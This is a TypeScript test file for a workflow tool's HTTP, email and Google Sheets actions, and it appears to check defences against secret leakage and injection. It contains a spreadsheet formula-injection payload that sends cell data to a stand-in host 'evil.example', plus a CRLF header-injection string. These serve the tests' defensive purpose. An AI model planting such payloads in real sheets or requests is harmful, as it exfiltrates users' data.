import { randomBytes } from "node:crypto";
import { createServer, type IncomingMessage, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";
import { renderTemplate, type ActionConnection, type ActionContext } from "@ignitra/core";
import { createKeyring } from "@ignitra/core/server";
import { connections, createDb, users, type DbHandle } from "@ignitra/db";
import { createEmailAction, emailParams } from "./actions/email";
import { createGoogleSheetsAction, googleSheetsParams } from "./actions/google-sheets";
import { httpRequestAction, httpRequestParams } from "./actions/http-request";
import { httpDestination, loadConnection, resendEmailCode, startEmailConnection, verifyEmailConnection } from "./connections";
import { exchangeGoogleCode, googleAuthUrl, signOAuthState, verifyOAuthState, type GoogleConfig } from "./google";
import { createSafeHttp } from "./http";
import { deriveOwnerSigningSecret, verifyWebhookSignature } from "./signing";

/** Phase 6 actions against local stubs of Resend, Brevo, Google OAuth / Sheets and a generic API. */

interface Hit {
  method: string;
  url: string;
  headers: IncomingMessage["headers"];
  body: string;
}
let server: Server;
let base: string;
let hits: Hit[] = [];
let respond: (hit: Hit) => { status?: number; body?: unknown; headers?: Record<string, string> } = () => ({});
const http = createSafeHttp({ allowPrivate: true });
const OWNER_SECRET = deriveOwnerSigningSecret("master-secret-for-tests", "usr_owner");

beforeAll(async () => {
  server = createServer((req, res) => {
    let body = "";
    req.on("data", (c) => (body += c));
    req.on("end", () => {
      const hit = { method: req.method ?? "", url: req.url ?? "", headers: req.headers, body };
      hits.push(hit);
      const r = respond(hit);
      res.statusCode = r.status ?? 200;
      res.setHeader("content-type", "application/json");
      for (const [k, v] of Object.entries(r.headers ?? {})) res.setHeader(k, v);
      res.end(JSON.stringify(r.body ?? { ok: true }));
    });
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
});

afterAll(() => {
  server.closeAllConnections();
  server.close();
});

beforeEach(() => {
  hits = [];
  respond = () => ({});
});

function ctx(overrides: Partial<ActionContext> = {}, trigger: Record<string, unknown> = {}): ActionContext {
  const scope = { trigger, steps: {}, flow: { id: "fl_1", name: "Orders", version: 1 }, run: { id: "run_1", idempotency_key: "4663:inbound:A-1:fl_1", test: false }, now_utc: "", now_wib: "" };
  return {
    runId: "run_1",
    flowId: "fl_1",
    flowName: "Orders",
    flowVersion: 1,
    stepId: "call",
    idempotencyKey: "4663:inbound:A-1:fl_1:call",
    runIdempotencyKey: "4663:inbound:A-1:fl_1",
    attempt: 1,
    isTest: false,
    signal: new AbortController().signal,
    trigger,
    render: (t, escape) => renderTemplate(t, scope, { escape: escape ?? "none" }),
    connection: null,
    http,
    push: null,
    ownerSigningSecret: OWNER_SECRET,
    chain: null,
    ...overrides,
  };
}

const conn = (type: ActionConnection["type"], metadata: Record<string, unknown>, secret: Record<string, unknown>): ActionConnection => ({ id: "conn_1", type, label: type, metadata, secret });

// ---------------------------------------------------------------------------
// HTTP_REQUEST
// ---------------------------------------------------------------------------

describe("HTTP_REQUEST", () => {
  const trigger = { body: { order: "A-1", note: 'say "hi"', total: 120 }, to: "0x5aaeb6053f3e94c9b9a09f33669435e7ef1beaed" };

  it("sends a JSON body built from templates (values JSON-escaped), signed, with a stable idempotency key", async () => {
    respond = () => ({ status: 201, body: { id: "ord_9", accepted: true } });
    const p = httpRequestParams.parse({
      url: `${base}/api/orders/{{trigger.body.order}}`,
      headers: [{ name: "X-Source", value: "ignitra {{flow.name}}" }],
      body: '{ "note": "{{trigger.body.note}}", "total": {{trigger.body.total}}, "wallet": "{{trigger.to}}" }',
    });
    const result = await httpRequestAction.execute(p, ctx({}, trigger));
    expect(result).toMatchObject({ status: "succeeded", httpStatus: 201, output: { status: 201, body: { id: "ord_9", accepted: true } } });
    const [hit] = hits;
    expect(hit?.url).toBe("/api/orders/A-1");
    expect(JSON.parse(hit?.body ?? "")).toEqual({ note: 'say "hi"', total: 120, wallet: trigger.to });
    expect(hit?.headers["x-source"]).toBe("ignitra Orders");
    expect(hit?.headers["content-type"]).toBe("application/json");
    expect(hit?.headers["x-ignitra-idempotency-key"]).toBe("4663:inbound:A-1:fl_1:call");
    expect(verifyWebhookSignature({ secret: OWNER_SECRET, body: hit?.body ?? "", signature: hit?.headers["x-ignitra-signature"] as string, timestamp: hit?.headers["x-ignitra-timestamp"] as string })).toBe(true);
  });

  it("refuses bodies that stop being JSON once rendered", async () => {
    const p = httpRequestParams.parse({ url: `${base}/api/x`, body: '{ "note": {{trigger.body.note}} }' });
    expect(await httpRequestAction.execute(p, ctx({}, trigger))).toMatchObject({ status: "failed", retryable: false, error: expect.stringMatching(/not valid JSON/) });
    expect(hits).toHaveLength(0);
  });

  it("sends a connection's secret headers only to its host, and never traces them", async () => {
    const host = new URL(base).host;
    const c = conn("http", { host, header_names: ["Authorization"] }, { headers: [{ name: "Authorization", value: "Bearer sk_live_secret" }] });
    const p = httpRequestParams.parse({ method: "GET", url: `${base}/api/me`, body_type: "none", connection_id: `conn_${"0".repeat(26)}`, sign: false });
    const ok = await httpRequestAction.execute(p, ctx({ connection: c }));
    expect(ok.status).toBe("succeeded");
    expect(hits[0]?.headers.authorization).toBe("Bearer sk_live_secret");
    expect(JSON.stringify(ok)).not.toContain("sk_live_secret");

    // On-chain data steering a templated URL elsewhere can never take the key with it.
    const steered = httpRequestParams.parse({ method: "GET", url: "https://{{trigger.host}}/collect", body_type: "none", connection_id: `conn_${"0".repeat(26)}`, sign: false });
    const blocked = await httpRequestAction.execute(steered, ctx({ connection: c }, { host: "evil.example" }));
    expect(blocked).toMatchObject({ status: "failed", retryable: false, error: `the connection's headers are only sent to ${host}, not evil.example` });
  });

  it("maps statuses: 5xx / 429 retry, 4xx and redirects do not; TEST runs are marked", async () => {
    const get = httpRequestParams.parse({ method: "GET", url: `${base}/api/x`, body_type: "none" });
    respond = () => ({ status: 503, headers: { "retry-after": "7" } });
    expect(await httpRequestAction.execute(get, ctx())).toMatchObject({ status: "failed", retryable: true, retryAfterMs: 7000 });
    respond = () => ({ status: 404 });
    expect(await httpRequestAction.execute(get, ctx())).toMatchObject({ status: "failed", retryable: false });
    respond = () => ({ status: 302, headers: { location: "http://10.0.0.1/" } });
    expect(await httpRequestAction.execute(get, ctx())).toMatchObject({ status: "failed", retryable: false, error: expect.stringMatching(/redirects are not followed/) });
    respond = () => ({});
    await httpRequestAction.execute(get, ctx({ isTest: true }));
    expect(hits.at(-1)?.headers["x-ignitra-test"]).toBe("true");
  });

  it("validates params at save time", () => {
    const issues = (p: unknown) => httpRequestParams.safeParse(p).error?.issues.map((i) => i.message) ?? [];
    expect(issues({ method: "GET", url: "https://x.example", body: "{}" })).toEqual(['GET requests carry no body (set body_type "none")']);
    expect(issues({ url: "https://x.example", body: "{}", headers: [{ name: "Host", value: "y" }] })).toEqual(["this header is set by IGNITRA or not allowed"]);
    expect(issues({ url: "{{trigger.url}}", body: "{}" })[0]).toMatch(/http\(s\) URL/); // the scheme must be literal
    expect(issues({ url: "ftp://x.example", body: "{}" })[0]).toMatch(/http\(s\) URL/);
    expect(issues({ url: "https://x.example" })).toEqual(['body_type "json" needs a body (or use "none")']);
    expect(issues({ url: "https://x.example", body_type: "form", form: [{ name: "a", value: "{{trigger.x}}" }] })).toEqual([]);
    // Credentials never sit in a flow definition (stored unencrypted): they go in an http connection.
    for (const name of ["Authorization", "X-API-Key", "api_key", "X-Auth-Token", "Cookie"]) {
      expect(issues({ method: "GET", url: "https://x.example", body_type: "none", headers: [{ name, value: "k" }] })).toEqual(["secret headers belong in an HTTP connection (stored encrypted), not in the flow"]);
    }
  });

  it("strips control characters that on-chain data could put into header values", async () => {
    const p = httpRequestParams.parse({ method: "GET", url: `${base}/api/x`, body_type: "none", sign: false, headers: [{ name: "X-Label", value: "{{trigger.label}}" }] });
    expect((await httpRequestAction.execute(p, ctx({}, { label: "a\r\nX-Injected: 1\u0000b" }))).status).toBe("succeeded");
    expect(hits[0]?.headers["x-label"]).toBe("a X-Injected: 1 b");
    expect(hits[0]?.headers["x-injected"]).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// EMAIL
// ---------------------------------------------------------------------------

describe("EMAIL", () => {
  const verified = conn("email", { address: "ops@team.example", verified: true }, {});
  const p = emailParams.parse({ connection_id: `conn_${"0".repeat(26)}`, subject: "Treasury below {{trigger.threshold}} ETH", body: "Balance: {{trigger.balance}}\n<b>not html</b>" });
  const trigger = { threshold: "2", balance: "1.5" };

  it("sends through Resend with the idempotency key; TEST runs say so in the subject", async () => {
    respond = () => ({ body: { id: "email_123" } });
    const resend = createEmailAction({ provider: "resend", apiKey: "re_test_key", from: "IGNITRA <alerts@ignitra.example>", apiBase: `${base}/resend` });
    const result = await resend.execute(p, ctx({ connection: verified, isTest: true }, trigger));
    expect(result).toMatchObject({ status: "succeeded", output: { message_id: "email_123", to: "ops@team.example" } });
    const hit = hits[0] as Hit;
    expect(hit.url).toBe("/resend/emails");
    expect(hit.headers.authorization).toBe("Bearer re_test_key");
    expect(hit.headers["idempotency-key"]).toBe("4663:inbound:A-1:fl_1:call");
    const sent = JSON.parse(hit.body);
    expect(sent).toMatchObject({ from: "IGNITRA <alerts@ignitra.example>", to: ["ops@team.example"], subject: "[TEST] Treasury below 2 ETH" });
    expect(sent.text).toMatch(/^Balance: 1\.5\n<b>not html<\/b>\n\n--\nSent by IGNITRA/);
    expect(sent.html).toContain("&lt;b&gt;not html&lt;/b&gt;"); // plain text stays text in the HTML twin
    expect(JSON.stringify(result)).not.toContain("re_test_key");
  });

  it("speaks Brevo too, and refuses unverified addresses or a missing configuration", async () => {
    respond = () => ({ status: 201, body: { messageId: "<brevo-1@smtp>" } });
    const brevo = createEmailAction({ provider: "brevo", apiKey: "xkeysib-test", from: "IGNITRA <alerts@ignitra.example>", apiBase: `${base}/brevo` });
    expect(await brevo.execute(p, ctx({ connection: verified }, trigger))).toMatchObject({ status: "succeeded", output: { message_id: "<brevo-1@smtp>" } });
    const hit = hits[0] as Hit;
    expect(hit.url).toBe("/brevo/v3/smtp/email");
    expect(hit.headers["api-key"]).toBe("xkeysib-test");
    expect(JSON.parse(hit.body)).toMatchObject({ sender: { name: "IGNITRA", email: "alerts@ignitra.example" }, to: [{ email: "ops@team.example" }], subject: "Treasury below 2 ETH" });

    const pending = conn("email", { address: "x@y.example", verified: false }, {});
    expect(await brevo.execute(p, ctx({ connection: pending }, trigger))).toMatchObject({ status: "failed", retryable: false, error: "x@y.example is not verified yet" });
    expect(await createEmailAction(null).execute(p, ctx({ connection: verified }, trigger))).toMatchObject({ status: "failed", retryable: false });
    respond = () => ({ status: 429 });
    expect(await brevo.execute(p, ctx({ connection: verified }, trigger))).toMatchObject({ status: "failed", retryable: true });
  });
});

// ---------------------------------------------------------------------------
// GOOGLE_SHEETS
// ---------------------------------------------------------------------------

describe("GOOGLE_SHEETS", () => {
  const SHEET = "1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms";
  const cfg = (): GoogleConfig => ({ clientId: "client-id.apps", clientSecret: "client-secret", redirectUri: "https://app.example/api/v1/connections/google/callback", tokenUrl: `${base}/oauth/token`, sheetsUrl: `${base}/sheets` });
  const google = conn("google", { email: "me@gmail.example" }, { refresh_token: "1//refresh" });
  let grant: "ok" | "revoked" = "ok";
  let sheetStatus = 200;

  beforeEach(() => {
    grant = "ok";
    sheetStatus = 200;
    respond = (hit) => {
      if (hit.url === "/oauth/token") {
        if (grant === "revoked") return { status: 400, body: { error: "invalid_grant", error_description: "Token has been expired or revoked." } };
        return { body: { access_token: `ya29.${hits.filter((h) => h.url === "/oauth/token").length}`, expires_in: 3599, token_type: "Bearer" } };
      }
      if (sheetStatus !== 200) return { status: sheetStatus, body: { error: { message: "denied", status: "PERMISSION_DENIED" } } };
      return { body: { updates: { updatedRange: "Buys!A7:C7", updatedRows: 1 } } };
    };
  });

  it("normalizes a pasted spreadsheet URL", () => {
    expect(googleSheetsParams.parse({ connection_id: `conn_${"0".repeat(26)}`, spreadsheet: `https://docs.google.com/spreadsheets/d/${SHEET}/edit#gid=0`, values: ["a"] })).toMatchObject({ spreadsheet: SHEET, sheet: "Sheet1", input: "USER_ENTERED" });
    expect(googleSheetsParams.safeParse({ connection_id: `conn_${"0".repeat(26)}`, spreadsheet: "nope", values: ["a"] }).success).toBe(false);
  });

  it("appends a row, refreshing the access token once and neutralising formula injection", async () => {
    const action = createGoogleSheetsAction(cfg());
    const p = googleSheetsParams.parse({ connection_id: `conn_${"0".repeat(26)}`, spreadsheet: SHEET, sheet: "Buys", values: ["{{trigger.time}}", "{{trigger.name}}", "{{trigger.amount}}"] });
    const trigger = { time: "2026-11-07T02:00:00Z", name: '=IMPORTXML("https://evil.example/?"&A1,"//a")', amount: "-12.5" };
    expect(await action.execute(p, ctx({ connection: google }, trigger))).toMatchObject({ status: "succeeded", output: { updated_range: "Buys!A7:C7", updated_rows: 1, spreadsheet_id: SHEET } });
    await action.execute(p, ctx({ connection: google }, trigger));
    expect(hits.filter((h) => h.url === "/oauth/token")).toHaveLength(1); // cached
    const append = hits.find((h) => h.url.startsWith("/sheets/")) as Hit;
    expect(append.url).toBe(`/sheets/v4/spreadsheets/${SHEET}/values/${encodeURIComponent("'Buys'!A1")}:append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS`);
    expect(append.headers.authorization).toBe("Bearer ya29.1");
    expect(JSON.parse(append.body)).toEqual({ majorDimension: "ROWS", values: [["2026-11-07T02:00:00Z", '\'=IMPORTXML("https://evil.example/?"&A1,"//a")', "-12.5"]] });
    const token = new URLSearchParams(hits[0]?.body);
    expect(Object.fromEntries(token)).toEqual({ client_id: "client-id.apps", client_secret: "client-secret", refresh_token: "1//refresh", grant_type: "refresh_token" });
  });

  it("explains revoked access and missing permissions; retries 401 with a fresh token", async () => {
    const p = googleSheetsParams.parse({ connection_id: `conn_${"0".repeat(26)}`, spreadsheet: SHEET, values: ["x"] });
    grant = "revoked";
    expect(await createGoogleSheetsAction(cfg()).execute(p, ctx({ connection: google }))).toMatchObject({ status: "failed", retryable: false, error: expect.stringMatching(/revoked or expired: reconnect Google/) });
    grant = "ok";
    const action = createGoogleSheetsAction(cfg());
    sheetStatus = 403;
    expect(await action.execute(p, ctx({ connection: google }))).toMatchObject({ status: "failed", retryable: false, error: expect.stringMatching(/no access to this spreadsheet with me@gmail\.example/) });
    sheetStatus = 401;
    expect(await action.execute(p, ctx({ connection: google }))).toMatchObject({ status: "failed", retryable: true });
    sheetStatus = 200;
    hits = [];
    expect((await action.execute(p, ctx({ connection: google }))).status).toBe("succeeded");
    expect(hits.filter((h) => h.url === "/oauth/token")).toHaveLength(1); // the 401 dropped the cached token
    expect(await createGoogleSheetsAction(null).execute(p, ctx({ connection: google }))).toMatchObject({ status: "failed", retryable: false });
  });

  it("OAuth: state binds the callback to the user; the code exchange needs the Sheets scope", async () => {
    const state = signOAuthState("master-secret-for-tests", "usr_a", 1_000);
    expect(verifyOAuthState("master-secret-for-tests", state, "usr_a", 2_000)).toBe(true);
    expect(verifyOAuthState("master-secret-for-tests", state, "usr_b", 2_000)).toBe(false);
    expect(verifyOAuthState("master-secret-for-tests", state, "usr_a", 1_000 + 601_000)).toBe(false);
    expect(verifyOAuthState("other-master-secret", state, "usr_a", 2_000)).toBe(false);
    expect(verifyOAuthState("master-secret-for-tests", `${state.split(".")[0]}x.${state.split(".")[1]}`, "usr_a", 2_000)).toBe(false);
    const url = new URL(googleAuthUrl(cfg(), state));
    expect(Object.fromEntries(url.searchParams)).toMatchObject({ access_type: "offline", prompt: "consent", response_type: "code", scope: "openid email https://www.googleapis.com/auth/spreadsheets", state });

    const idToken = `x.${Buffer.from(JSON.stringify({ email: "me@gmail.example" })).toString("base64url")}.y`;
    respond = () => ({ body: { access_token: "ya29.a", refresh_token: "1//new", expires_in: 3599, id_token: idToken, scope: "openid https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/spreadsheets" } });
    expect(await exchangeGoogleCode(http, cfg(), "4/code")).toMatchObject({ refreshToken: "1//new", email: "me@gmail.example" });
    respond = () => ({ body: { access_token: "ya29.a", refresh_token: "1//new", scope: "openid email" } });
    await expect(exchangeGoogleCode(http, cfg(), "4/code")).rejects.toThrow(/Sheets permission was not granted/);
  });
});

// ---------------------------------------------------------------------------
// Connections: verified email recipients, host-bound HTTP secrets
// ---------------------------------------------------------------------------

describe("connections", () => {
  let h: DbHandle;
  const keyring = createKeyring({ kid: "k1", key: randomBytes(32) });
  const mail = { provider: "resend" as const, apiKey: "re_test_key", from: "IGNITRA <alerts@ignitra.example>", apiBase: `` };

  beforeAll(async () => {
    h = await createDb("pglite://memory");
    await h.migrate();
    await h.db.insert(users).values({ id: "usr_owner", address: "0x00000000000000000000000000000000000000aa" });
  });

  afterAll(async () => {
    await h.close();
  });

  it("verifies an email address with a mailed 6-digit code before flows may use it", async () => {
    respond = () => ({ body: { id: "email_1" } });
    const cfg = { ...mail, apiBase: `${base}/resend` };
    const t0 = Date.parse("2026-11-07T00:00:00Z");
    const c = await startEmailConnection(h.db, keyring, http, cfg, { ownerId: "usr_owner", address: "Ops@Team.EXAMPLE", now: t0 });
    expect(c.metadata).toMatchObject({ address: "Ops@team.example", verified: false });
    const code = /code is (\d{6})/.exec(JSON.parse(hits[0]?.body ?? "{}").text as string)?.[1] as string;
    expect(code).toMatch(/^\d{6}$/);
    const [row] = await h.db.select().from(connections);
    expect(JSON.stringify(row)).not.toContain(code); // only a hash, encrypted

    const wrong = code === "000000" ? "111111" : "000000";
    await expect(verifyEmailConnection(h.db, keyring, { id: c.id, ownerId: "usr_owner", code: wrong, now: t0 + 1000 })).rejects.toThrow(/wrong code \(4 attempts left\)/);
    await expect(verifyEmailConnection(h.db, keyring, { id: c.id, ownerId: "usr_other", code, now: t0 + 1000 })).rejects.toThrow(/not found/);
    await expect(resendEmailCode(h.db, keyring, http, cfg, { id: c.id, ownerId: "usr_owner", now: t0 + 10_000 })).rejects.toThrow(/wait a minute/);
    const ok = await verifyEmailConnection(h.db, keyring, { id: c.id, ownerId: "usr_owner", code, now: t0 + 2000 });
    expect(ok.metadata).toMatchObject({ address: "Ops@team.example", verified: true });
    expect((await loadConnection(h.db, keyring, c.id))?.secret).toEqual({});

    const late = await startEmailConnection(h.db, keyring, http, cfg, { ownerId: "usr_owner", address: "late@team.example", now: t0 });
    const lateCode = /code is (\d{6})/.exec(JSON.parse(hits.at(-1)?.body ?? "{}").text as string)?.[1] as string;
    await expect(verifyEmailConnection(h.db, keyring, { id: late.id, ownerId: "usr_owner", code: lateCode, now: t0 + 31 * 60_000 })).rejects.toThrow(/expired/);
  });

  it("does not keep a connection whose code could not be sent", async () => {
    respond = () => ({ status: 401, body: { message: "invalid key" } });
    const before = (await h.db.select().from(connections)).length;
    await expect(startEmailConnection(h.db, keyring, http, { ...mail, apiBase: `${base}/resend` }, { ownerId: "usr_owner", address: "x@team.example" })).rejects.toThrow(/could not send the verification email/);
    expect(await h.db.select().from(connections)).toHaveLength(before);
  });

  it("binds HTTP secret headers to one host and rejects risky headers", () => {
    expect(httpDestination({ host: "https://api.example.com/v1", headers: [{ name: "Authorization", value: "Bearer k" }] }).metadata).toEqual({ host: "api.example.com", header_names: ["Authorization"] });
    expect(() => httpDestination({ host: "api.example.com", headers: [{ name: "Host", value: "x" }] })).toThrow(/not allowed/);
    expect(() => httpDestination({ host: "api.example.com", headers: [{ name: "X-Key", value: "a\r\nInjected: 1" }] })).toThrow(/single-line/);
    expect(httpDestination({ host: "api.example.com", headers: [{ name: "X-Key", value: "k" }], sign: true }).signingSecret).toMatch(/^whsec_/);
  });
});
